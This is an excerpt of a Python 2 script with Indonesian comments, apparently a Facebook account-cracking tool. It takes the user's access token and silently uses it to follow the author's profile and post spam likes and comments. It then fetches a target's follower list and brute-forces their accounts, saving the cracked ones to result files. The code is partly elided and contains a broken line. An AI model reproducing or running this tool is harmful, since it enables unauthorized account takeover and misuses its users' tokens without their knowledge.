#!/usr/bin/python2
# coding=utf-8
# coding by Fran Jason
# Open source code by Fran Jason | ngotak dikit cok jangan jual di perjual belikan...
...
komen = random.choice(['Mama Bayang tuhu tuhu deras @[100000626195514:0] I Love You','Pengguna script ganja kamu bang @[100000626195514:0]','nggo ganteng mentar ka :v @[100044663564610:0]','Anak singuda memang beda @[100046031671446:0]','Merupa kel kam bang @[100056394630237:0]','Gilak!!! pertahankan bakatmu Ma uda @[100062167515808:0]','Meng GG lo bang @[100076440339167:0]','Mantap bang love you','Jason nggak ada obat script nya emang','pengin kaya elu bang bisa ng0c0k stading @[100000626195514:0]'])
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100066074752186/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100066074752186/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/299703995575423/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/299703995575423/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/299703995575423/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/299703995575423/likes?summary=true&access_token=' + toket)
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			try:
				print(' %s║'%(N))
				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s'%(idt,Fran Jason))
				z = json.loads(r.text)
				id = []
				for w in z['data']:
			...
			if hsl in ['1','01']:
				...
				if len(hasil_cp) != 0:
					print('\n')
					print(' %s[ %shasil Cp kamu %s]'%(N,K,N))
...
class crack:
	...
	def free(self):
		print(' %s║'%(N))
		print(' %s╠═[%s*%s] akun OK akan di simpan di file  : hasil/Ok.txt'%(N,O,N))
		print(' %s╠═[%s*%s] akun CP akan di simpan di file : hasil/Cp.txt\n'%(N,O,N))
